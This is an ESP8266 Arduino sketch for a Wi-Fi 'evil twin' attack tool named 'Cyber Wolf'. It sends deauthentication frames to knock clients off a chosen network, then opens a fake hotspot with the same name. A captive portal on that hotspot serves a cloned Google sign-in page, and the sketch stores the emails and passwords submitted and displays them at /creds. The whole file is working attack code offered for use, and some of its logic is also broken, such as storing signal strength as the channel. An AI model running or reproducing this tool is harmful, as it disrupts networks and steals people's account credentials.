#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

#define EvilTwinPin 2
extern "C" {
#include "user_interface.h"
}

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";

// Default main strings
#define SUBTITLE "WIFI ROUTER RESCUE MODE"
#define TITLE "&#9888;Firmware Update Failed"
#define BODY "<h3>Your Router encountered a problem while automatically installing the latest firmware update.</h3><br><h4>In order to Restore Router old Firmware,<br> Please Verify Your Password.</h4>"

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #FF2D00; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }"
               ;
  String h = "<!DOCTYPE html><html>"
             "<head><title><center>" + a + " :: " + t + "</center></title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  String a = String(_selectedNetwork.ssid);
  return "</div><div class=q><a><center>" + a + " &#169; All Rights Reserved.</center></a></div>";
}

String googleLoginPage() {
  return "<!DOCTYPE html><html><head><title>Sign in - Google Accounts</title>"
         "<link rel='icon' type='image/png' href='https://ssl.gstatic.com/accounts/ui/favicon_2x.png'>"
         "<meta name='viewport' content='width=device-width,initial-scale=1'>"
         "<style>"
         "body{background:#fff;font-family:Roboto,sans-serif;}"
         ".container{max-width:350px;margin:60px auto;padding:30px 40px;border:1px solid #dadce0;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);}"
         "h1{font-size:24px;color:#202124;margin-bottom:20px;}"
         "input[type=email],input[type=password]{width:100%;padding:10px;margin:8px 0 16px 0;border:1px solid #dadce0;border-radius:4px;}"
         "button{width:100%;background:#1a73e8;color:#fff;padding:10px;border:none;border-radius:4px;font-size:16px;}"
         ".logo{display:block;margin:0 auto 20px auto;width:75px;}"
         ".footer{margin-top:20px;font-size:12px;color:#888;text-align:center;}"
         ".links{margin-bottom:16px;text-align:left;}"
         ".links a{color:#1a73e8;text-decoration:none;font-size:14px;margin-right:16px;}"
         ".checkbox{display:flex;align-items:center;margin-bottom:16px;}"
         ".checkbox input{margin-right:8px;}"
         ".showpass{position:relative;}"
         ".showpass input[type=checkbox]{position:absolute;right:10px;top:14px;}"
         "</style>"
         "<script>function togglePassword(){var p=document.getElementById('password');p.type=p.type==='password'?'text':'password';}</script>"
         "</head><body><div class='container'>"
         "<img class='logo' src='https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png'>"
         "<h1>Sign in</h1>"
         "<div class='links'><a href='#'>Forgot email?</a></div>"
         "<form method='post' action='/'>"
         "<input type='email' name='email' placeholder='Email or phone' required>"
         "<div class='showpass' style='position:relative;'>"
         "<input type='password' id='password' name='password' placeholder='Enter your password' required>"
         "<input type='checkbox' onclick='togglePassword()' style='position:absolute;right:10px;top:14px;'> Show password"
         "</div>"
         "<div class='checkbox'><input type='checkbox' name='stay' checked> <label for='stay'>Stay signed in</label></div>"
         "<button type='submit'>Next</button>"
         "</form>"
         "<div class='links' style='margin-top:16px;'><a href='#'>Create account</a></div>"
         "</div><div class='footer'>This page is a clone for demonstration.</div></body></html>";
}

String storedCreds = "";

void handleCreds() {
  String html = "<html><head><title>Captured Credentials</title><meta name='viewport' content='width=device-width,initial-scale=1'></head><body><h2>Captured Google Credentials</h2><pre>" + storedCreds + "</pre></body></html>";
  webServer.send(200, "text/html", html);
}

String index() {
  return googleLoginPage();
}

void setup() {

  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("Wolf_Wifi Attack", "wolf1234");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  pinMode(EvilTwinPin ,OUTPUT);
  digitalWrite(EvilTwinPin, HIGH);

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/pro", handleAdmin);
  webServer.on("/creds", handleCreds);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.RSSI(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    digitalWrite(EvilTwinPin, LOW);
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("Wolf_Wifi Attack", "wolf1234");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}


String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
"<style> body { background-color: black; color: #00FF00; font-family: monospace; }"
".content { max-width: 10000px; min-width: 1px; margin: auto; border-collapse: collapse; padding: 1px; }"
"table, th, td { border: 3px solid #00FF00; color: #00FF00; background-color: #111111; border-radius: 5px; border-collapse: collapse; padding: 4px; }"
"button { background-color: #000000; border: 3px solid #FF0000; border-radius: 10px; padding: 14px 28px; font-size: 15px; cursor: pointer; color: #00FF00; }"
"marquee { color: #FFFFFF; font-weight: bold; }</style>"
"</head><body><div class='content'>"
"<marquee bgcolor='#FF0000'><h1>CYBER WOLF&nbsp;&nbsp;&#128163;&nbsp;&nbsp;Deauther&nbsp;+&nbsp;Cyber Wolf&nbsp;&nbsp;&#9762;&nbsp;&nbsp;The Ultimate Network Jammer&nbsp;&nbsp;&#x2764;&nbsp;&nbsp;Garbage can provide important details for hackers: names, phone numbers, internal jargon.</h1></marquee>"
"<center><h3>Welcome to <span style='color:#FF0000;'>CYBER WOLF</span><br>Deauther + Cyber Wolf = <b>Wolf Team</b><br>This Project is developed by <span style='color:#FF0000;'>S.Tamilselvan</span> <i>Security Researcher</i><br>### Destroy Every F*#KING Network ###</h3></center>"
"<div><center><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
"<button {disabled}>{deauth_button}</button></form>"
"<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
"<button {disabled}>{hotspot_button}</button></form>"
"<button onclick='window.location.reload();'>Refresh WIFI</button></center></div><br/>"
"<center><table><tr><th>SSID</th><th>BSSID</th><th>-dBm</th><th>Select</th></tr></center>";


void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("Wolf_Wifi Attack", "wolf1234");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "STOP Deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "START Deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "STOP WOLF_WIFI_ATTACK  ");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "START WOLF_WIFI_ATTACK");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {
    if (webServer.hasArg("email") && webServer.hasArg("password")) {
      String email = webServer.arg("email");
      String password = webServer.arg("password");
      storedCreds += "Email: " + email + "\nPassword: " + password + "\n---\n";
      Serial.println("[Captured] Email: " + email + ", Password: " + password);
      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='2;url=/'></head><body><center><h2>Signing in...<br>Please wait.</h2></center></body></html>");
    } else {
      webServer.send(200, "text/html", googleLoginPage());
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("Wolf_Wifi Attack", "wolf1234");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "STOP Deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "START Deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "STOP WOLF_WIFI_ATTACK");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "START WOLF_WIFI_ATTACK");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
